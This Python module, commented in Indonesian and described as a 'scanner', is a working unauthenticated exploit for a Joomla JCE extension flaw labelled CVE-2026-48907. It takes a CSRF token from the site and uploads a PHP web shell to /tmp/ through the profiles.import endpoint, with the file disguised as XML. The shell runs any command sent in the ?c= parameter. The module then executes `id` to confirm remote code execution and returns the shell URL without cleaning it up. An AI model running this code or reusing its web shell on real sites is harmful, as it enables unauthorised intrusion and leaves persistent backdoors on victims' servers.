# cve_modules/cve_2026_48907.py
"""
CVE-2026-48907 — Joomla JCE Extension Unauthenticated RCE
Adaptasi dari tools exploit Cyp1337 (https://github.com/0xCyp1337)
diubah jadi modul scanning untuk main.py.

Hanya bagian deteksi/verifikasi yang dipertahankan:
  - cek target Joomla
  - ambil CSRF token
  - upload PHP probe shell ke /tmp/
  - verifikasi marker shell
  - (opsional) verifikasi RCE via ?c=id

Bagian UI/menu/interactive shell/mass-mode dibuang.
"""

import hashlib
import os
import re
import urllib.parse

import requests
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MARKER = "CVE-2026-48907"
DEFAULT_TIMEOUT = 15

# Shell minimal yang cukup buat verifikasi marker + ?c=id.
# Sengaja tidak pakai BASE_SHELL_CODE penuh (yang ada uploader + form HTML),
# biar artefak di target seminimal mungkin.
PROBE_SHELL_CODE = '''<?php
header('Content-Type: text/plain');
$c=$_REQUEST['c']??'';
if(!$c){die('CVE-2026-48907 ready');}
if(function_exists('shell_exec')){echo trim(shell_exec($c));}
elseif(function_exists('system')){ob_start();system($c);echo trim(ob_get_clean());}
else{echo 'no exec';}
?>'''


def _make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/126.0.0.0 Safari/537.36"
    })
    s.verify = False
    return s


def _rand_str(n: int = 8) -> str:
    return hashlib.sha256(os.urandom(16)).hexdigest()[:n]


def _check_shell(session, shell_url, timeout) -> bool:
    try:
        r = session.get(shell_url, timeout=timeout, allow_redirects=True)
        if r.status_code == 200 and MARKER in r.text:
            return True
    except requests.RequestException:
        pass
    return False


def _verify_rce(session, shell_url, timeout):
    try:
        r = session.get(shell_url + "?c=" + urllib.parse.quote("id"),
                        timeout=timeout)
        if r.status_code == 200:
            m = re.search(r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)", r.text)
            if m:
                return m.group(0)
            m = re.search(r"uid=\d+\([^)]+\)", r.text)
            if m:
                return m.group(0)
    except requests.RequestException:
        pass
    return None


def check_cve_2026_48907(target_url: str,
                         timeout: int = DEFAULT_TIMEOUT,
                         verify_rce: bool = True) -> dict:
    """
    Cek apakah target rentan terhadap CVE-2026-48907.

    Args:
        target_url : URL target (boleh tanpa scheme)
        timeout    : timeout HTTP request (default 15s)
        verify_rce : kalau True, lanjut eksekusi `id` untuk konfirmasi RCE.
                     kalau False, cukup sampai tahap marker shell terdeteksi.

    Returns:
        {
            "vulnerable": bool,
            "evidence":   str | None,
            "reason":     str,
            "shell_url":  str | None,
        }
    """
    # normalisasi URL
    target = target_url.rstrip("/")
    target_clean = re.sub(r"^https?://", "", target)
    url = f"https://{target_clean}"

    sess = _make_session()

    # ── 0. reachability ──────────────────────────────────────────────
    try:
        r = sess.get(url + "/", timeout=timeout)
    except requests.RequestException as e:
        return {"vulnerable": False, "evidence": None,
                "reason": f"connection_error: {e}", "shell_url": None}

    if r.status_code != 200:
        return {"vulnerable": False, "evidence": None,
                "reason": f"http_{r.status_code}_on_root", "shell_url": None}

    # ── 1. ambil CSRF token ──────────────────────────────────────────
    m = (re.search(r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"', r.text)
         or re.search(r'<input[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
                      r.text, re.I))
    if not m:
        return {"vulnerable": False, "evidence": None,
                "reason": "no_csrf_token", "shell_url": None}
    csrf_token = m.group(1)

    # ── 2. upload probe shell ke /tmp/ ───────────────────────────────
    shell_name = f"cve_probe_{_rand_str(8)}.php"
    try:
        r = sess.post(
            url + "/index.php?option=com_jce",
            files={"profile_file": (shell_name,
                                    PROBE_SHELL_CODE.encode(),
                                    "application/xml")},
            data={"task": "profiles.import", csrf_token: "1"},
            timeout=timeout,
        )
    except requests.RequestException as e:
        return {"vulnerable": False, "evidence": None,
                "reason": f"upload_error: {e}", "shell_url": None}

    if r.status_code != 200:
        return {"vulnerable": False, "evidence": None,
                "reason": f"upload_status_{r.status_code}", "shell_url": None}

    # ── 3. verifikasi marker shell di /tmp/ ──────────────────────────
    shell_url = urljoin(url, f"/tmp/{shell_name}")
    if not _check_shell(sess, shell_url, timeout):
        return {"vulnerable": False, "evidence": None,
                "reason": "shell_not_found", "shell_url": None}

    # ── 4. verifikasi RCE (opsional) ─────────────────────────────────
    if verify_rce:
        uid = _verify_rce(sess, shell_url, timeout)
        if uid:
            return {"vulnerable": True,
                    "evidence": f"RCE confirmed: {uid}",
                    "reason": "arbitrary_file_upload_and_rce",
                    "shell_url": shell_url}

    # shell ke-upload tapi RCE belum/tidak diverifikasi
    return {"vulnerable": True,
            "evidence": f"PHP probe accessible at {shell_url}",
            "reason": "arbitrary_file_upload",
            "shell_url": shell_url}